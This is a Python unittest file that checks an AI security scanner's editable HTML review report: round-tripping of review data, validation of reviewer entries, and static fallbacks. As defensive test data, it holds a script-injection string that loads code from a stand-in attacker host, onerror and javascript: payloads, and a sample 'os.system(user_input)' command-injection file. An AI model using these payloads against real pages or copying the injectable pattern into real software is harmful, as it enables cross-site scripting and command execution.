"""Editable report round trips retain evidence and treat review data as inert text."""
import copy
import json
from pathlib import Path
import shutil
import subprocess
import tempfile
import unittest
from unittest import mock

from ai_security_scan.assessment import build_assessment
from ai_security_scan.methodology import build_methodology
from ai_security_scan.report_html import _REVIEW_SCRIPT, _review_json, html_report
from ai_security_scan.review_workspace import build_workspace, load_review_report
from ai_security_scan.scanner import scan
from tests.test_report_html import Document, assert_trusted_script_boundary


NODE = shutil.which('node')
HARNESS = Path(__file__).parent / 'fixtures' / 'review_editor_dom.cjs'


class ReportReviewEditorTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name).resolve()
        self.root = self.base / 'source'
        self.root.mkdir()
        (self.root / 'agent.py').write_text('import os\nos.system(user_input)\n', encoding='utf-8')
        (self.root / 'broken.py').write_text('def broken(:\n', encoding='utf-8')
        self.report = scan(self.root)
        self.report['assessment'] = build_assessment(self.report)
        self.workspace = build_workspace(self.report)
        self.finding = next(item for item in self.workspace['items'] if item['kind'] == 'finding')
        self.check = next(item for item in self.workspace['items'] if item['kind'] == 'check')
        self.gap = next(item for item in self.workspace['items'] if item['kind'] == 'gap')

    def run_editor(self, edits, format='html', workspace=None):
        if not NODE:
            self.skipTest('Node is required only for the optional local editor DOM harness')
        payload = {'script': _REVIEW_SCRIPT, 'workspace': workspace or self.workspace, 'edits': edits, 'format': format}
        run = subprocess.run([NODE, str(HARNESS)], input=json.dumps(payload), text=True, capture_output=True, timeout=10)
        self.assertEqual(run.returncode, 0, run.stderr)
        return json.loads(run.stdout)

    def test_capsule_forms_and_navigation_cover_every_current_item(self):
        original = copy.deepcopy(self.report)
        page = html_report(self.report)
        doc = assert_trusted_script_boundary(self, page)
        self.assertEqual(self.report, original)
        capsule = json.loads(next(item['text'] for item in doc.scripts if item['attrs'].get('id') == 'invarune-review'))
        self.assertEqual(capsule, self.workspace)
        artifact = self.base / 'generated-report.html'
        artifact.write_text(page, encoding='utf-8')
        self.assertEqual(load_review_report(artifact), self.workspace)
        fieldsets = [attrs['data-review-id'] for tag, attrs in doc.tags if tag == 'fieldset']
        self.assertEqual(set(fieldsets), {item['id'] for item in self.workspace['items']})
        self.assertEqual(len(fieldsets), len(self.workspace['items']))
        identifiers = {attrs['id'] for _, attrs in doc.tags if 'id' in attrs}
        for section in ('summary', 'review-workspace', 'method', 'configuration', 'coverage', 'controls', 'findings', 'gap-review'):
            self.assertIn(section, identifiers)
        labels = [attrs['for'] for tag, attrs in doc.tags if tag == 'label']
        self.assertTrue(set(labels) <= identifiers)
        self.assertEqual(len(labels), 5 * len(self.workspace['items']))
        self.assertIn('Download reviewed HTML', ' '.join(doc.text))
        self.assertIn('Save As', ' '.join(doc.text))
        self.assertIn('--review-report', ' '.join(doc.text))
        self.assertIn('scan totals remain the original snapshot', ' '.join(doc.text))

    def test_charts_and_miss_scenarios_use_real_counts_and_common_methodology(self):
        report = copy.deepcopy(self.report)
        report['run_configuration'] = {'optional_review': {'enabled': False, 'provider': None, 'mode': 'full', 'findings_limit': 17, 'include_finding_source': False},
                                       'reporting': {'failure_threshold': 'medium', 'formats': ['html', 'markdown', 'json', 'sarif']}}
        page = html_report(report)
        doc = Document(page)
        summary = ' '.join(doc.sections['summary'])
        self.assertIn('Finding dispositions', summary)
        self.assertIn('Open findings: 1', summary)
        mapped = sum(bool(control['automated_rule_ids']) for control in report['controls'])
        checks = sum(len(control['checks']) for control in report['controls'])
        self.assertIn('Partial static mapping: ' + str(mapped), summary)
        self.assertIn('No mapped detector: ' + str(len(report['controls']) - mapped), summary)
        self.assertIn('0/' + str(checks) + ' active acceptance checks', summary)
        self.assertIn('not a control pass rate', summary)
        method = ' '.join(doc.sections['method'])
        for area in build_methodology(report)['areas']:
            for field in ('area', 'deterministic', 'optional_review', 'can_miss_or_misclassify', 'runtime_or_human_validation'):
                self.assertIn(area[field], method)
        configuration = ' '.join(doc.sections['configuration'])
        self.assertIn('17 / False', configuration)
        self.assertIn('budgets are limits, not work completed', configuration)
        for tag, attrs in doc.tags:
            if tag == 'svg':
                self.assertEqual(attrs.get('role'), 'img')
                self.assertTrue(attrs.get('aria-label'))

    def test_review_strings_cannot_close_json_script_or_create_active_markup(self):
        report = copy.deepcopy(self.report)
        workspace = copy.deepcopy(self.workspace)
        hostile = '</script><script src="https://attacker.test/code"></script><img onerror="run()"> & \u2028 😀'
        workspace['items'][0].update(decision='note', reason=hostile, reviewer='\" onfocus=\"run()', evidence_ref='javascript:run()')
        report['review_workspace'] = workspace
        page = html_report(report)
        doc = assert_trusted_script_boundary(self, page)
        self.assertNotIn('img', [tag for tag, _ in doc.tags])
        self.assertNotIn(hostile, page)
        for _, attrs in doc.tags:
            self.assertFalse(any(name.startswith('on') for name in attrs))
            self.assertNotEqual(attrs.get('href'), 'javascript:run()')
        capsule = json.loads(next(item['text'] for item in doc.scripts if item['attrs'].get('id') == 'invarune-review'))
        self.assertEqual(capsule['items'][0]['reason'], hostile)
        self.assertEqual(capsule, json.loads(_review_json(workspace)))

    def test_download_html_persists_capsule_and_native_control_values(self):
        reason = '</script><script>untrusted()</script>\nReviewed "quoted" evidence & emoji 😀. C1 \u0085.'
        edits = [{'id': self.finding['id'], 'values': {'decision': 'justified', 'reason': reason, 'reviewer': 'Owner <name>', 'reviewed_at': '2026-09-19', 'evidence_ref': 'SEC-123'}},
                 {'id': self.check['id'], 'values': {'decision': 'needs_runtime_validation', 'reason': 'Exercise tenant isolation.'}}]
        result = self.run_editor(edits)
        self.assertEqual(result['validity_errors'], [])
        self.assertEqual(len(result['downloads']), 1)
        download = result['downloads'][0]
        self.assertEqual(download['filename'], 'invarune-reviewed.html')
        self.assertIn('Original scan snapshot', download['content'])
        path = self.base / download['filename']
        path.write_text(download['content'], encoding='utf-8')
        loaded = load_review_report(path)
        records = {item['id']: item for item in loaded['items']}
        self.assertEqual(records[self.finding['id']]['reason'], reason)
        self.assertEqual(records[self.finding['id']]['decision'], 'justified')
        self.assertEqual(records[self.finding['id']]['reviewer'], 'Owner <name>')
        self.assertEqual(records[self.check['id']]['decision'], 'needs_runtime_validation')
        self.assertEqual(records[self.gap['id']]['decision'], '')
        for before in self.workspace['items']:
            for field in ('id', 'kind', 'subject', 'binding_sha256'):
                self.assertEqual(records[before['id']][field], before[field])
        self.assertEqual(loaded['origin'], self.workspace['origin'])
        doc = Document(download['content'])
        self.assertNotIn('script>untrusted()', download['content'])
        self.assertEqual(len(doc.scripts), 1)
        self.assertIn(reason, ' '.join(doc.text))
        selections = [attrs['value'] for tag, attrs in doc.tags if tag == 'option' and 'selected' in attrs]
        self.assertIn('justified', selections)
        self.assertIn('needs_runtime_validation', selections)
        self.assertIn('Owner <name>', [attrs.get('value') for tag, attrs in doc.tags if tag == 'input'])

    def test_download_review_json_imports_the_same_review_fields(self):
        edit = {'id': self.gap['id'], 'values': {'decision': 'note', 'reason': 'Read access pending.', 'reviewer': 'Platform team'}}
        result = self.run_editor([edit], format='json')
        download = result['downloads'][0]
        path = self.base / download['filename']
        path.write_text(download['content'], encoding='utf-8')
        loaded = load_review_report(path)
        record = next(item for item in loaded['items'] if item['id'] == self.gap['id'])
        self.assertEqual(record['decision'], 'note')
        self.assertEqual(record['reason'], 'Read access pending.')
        self.assertEqual(record['binding_sha256'], self.gap['binding_sha256'])
        self.assertEqual(download['mime'], 'application/json;charset=utf-8')

    def test_editor_rejects_incomplete_or_forbidden_review_decisions(self):
        cases = [
            (self.finding, {'decision': 'justified', 'reason': 'Recorded exception.'}, 'reviewer'),
            (self.finding, {'decision': 'disabled', 'reviewer': 'Owner'}, 'reason'),
            (self.check, {'decision': '', 'reason': 'Unclassified text.'}, 'decision'),
            (self.gap, {'decision': 'justified', 'reason': 'Skip it.', 'reviewer': 'Owner'}, 'allowed'),
            (self.gap, {'decision': 'disabled', 'reason': 'Skip it.', 'reviewer': 'Owner'}, 'allowed'),
            (self.check, {'decision': 'note', 'reason': 'Text.', 'reviewed_at': '2026-02-30'}, 'ISO'),
            (self.check, {'decision': 'note', 'reason': 'Text.', 'reviewed_at': '2026-09-19T23:12:59.1234567Z'}, 'ISO'),
            (self.check, {'decision': 'note', 'reason': 'x' * 8001}, 'limit'),
            (self.check, {'decision': 'note', 'reason': 'Text.', 'reviewer': 'Owner\u0085'}, 'control character'),
            (self.check, {'decision': 'note', 'reason': 'Text.', 'reviewer': 'Owner\nNext'}, 'control character'),
            (self.check, {'decision': 'note', 'reason': 'Text.\ud800'}, 'Unicode'),
        ]
        for item, values, expected in cases:
            with self.subTest(values={key: value[:40] for key, value in values.items()}):
                result = self.run_editor([{'id': item['id'], 'values': values}])
                self.assertEqual(result['downloads'], [])
                self.assertIn(expected, result['status'])
                self.assertTrue(result['validity_errors'])

    def test_export_failure_is_visible_up_front_when_optional_review_is_off(self):
        report = copy.deepcopy(self.report)
        report['export_errors'] = [{'format': 'pdf', 'error': 'PDF dependency unavailable.'}]
        report['execution'] = {'failure_threshold': 'high', 'finding_gate_triggered': True, 'exit_code': 2}
        doc = Document(html_report(report))
        summary = ' '.join(doc.sections['summary'])
        self.assertIn('Report export incomplete:', summary)
        self.assertIn('PDF dependency unavailable.', summary)
        self.assertIn('Existing scan evidence is retained', summary)
        self.assertIn('Optional review', summary)

    def test_oversized_workspace_retains_readable_static_report_without_editor(self):
        report = copy.deepcopy(self.report)
        report['review_workspace'] = self.workspace
        report['review_workspace_unavailable'] = {'reason': 'Review capsule exceeds 4,000,000 bytes.', 'max_items': 10000}
        with mock.patch('ai_security_scan.review_workspace.build_workspace', side_effect=AssertionError('Must not rebuild an oversized workspace')):
            page = html_report(report)
        doc = Document(page)
        self.assertEqual(doc.scripts, [])
        self.assertNotIn('fieldset', [tag for tag, _ in doc.tags])
        self.assertNotIn('select', [tag for tag, _ in doc.tags])
        self.assertNotIn('textarea', [tag for tag, _ in doc.tags])
        self.assertNotIn('download-reviewed-html', [attrs.get('id') for _, attrs in doc.tags])
        self.assertNotIn('invarune-review', [attrs.get('id') for _, attrs in doc.tags])
        policy = next(attrs['content'] for tag, attrs in doc.tags if tag == 'meta' and attrs.get('http-equiv') == 'Content-Security-Policy')
        self.assertIn("script-src 'none'", policy)
        self.assertIn('Review editing unavailable', ' '.join(doc.sections['summary']))
        self.assertIn('No editable fields or importable review capsule', ' '.join(doc.sections['review-workspace']))
        self.assertIn(self.report['findings'][0]['evidence'], ' '.join(doc.sections['findings']))
        artifact = self.base / 'static-only.html'
        artifact.write_text(page, encoding='utf-8')
        with self.assertRaises(ValueError):
            load_review_report(artifact)

    def test_import_audit_keeps_prior_reasons_visible_with_stale_and_new_evidence(self):
        report = copy.deepcopy(self.report)
        old = {**self.finding, 'decision': 'justified', 'reason': 'Prior recorded reason.', 'reviewer': 'Owner', 'reason_for_status': 'File content changed.'}
        report['review_import'] = {'enabled': True, 'status': 'incomplete', 'origin_scan_id': '0' * 64,
                                  'applied': [], 'stale': [old], 'out_of_scope': [], 'not_redetected': [], 'unresolved': []}
        doc = Document(html_report(report))
        review = ' '.join(doc.sections['review-workspace'])
        self.assertIn('Prior recorded reason.', review)
        self.assertIn('File content changed.', review)
        self.assertIn('Stale: evidence or catalog changed', review)
        self.assertIn('Fresh scan evidence and active findings remain', review)
        self.assertIn(self.report['findings'][0]['evidence'], ' '.join(doc.sections['findings']))


if __name__ == '__main__':
    unittest.main()
